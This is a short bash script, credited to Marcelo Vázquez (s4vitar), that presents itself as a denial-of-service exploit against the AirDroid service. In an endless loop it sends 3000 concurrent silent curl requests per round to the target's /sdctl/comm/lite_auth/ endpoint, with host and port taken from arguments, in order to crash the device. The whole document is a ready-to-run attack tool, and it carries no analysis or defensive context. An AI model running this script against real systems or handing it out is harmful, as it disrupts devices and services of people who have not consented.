#!/bin/bash

# *****************************************************
# *       Author: Marcelo Vázquez (aka s4vitar)       *
# *  AirDroid Denial of Service (DoS) [System Crash]  *
# *****************************************************

trap ctrl_c INT

function ctrl_c() {
        echo -e "\n\n[*]Exiting...\n" && tput cnorm
        pkill curl > /dev/null 2>&1
        exit
}

while true; do
	for i in $(seq 1 3000); do
		curl --silent "http://$1:$2/sdctl/comm/lite_auth/" &
	done && wait
done
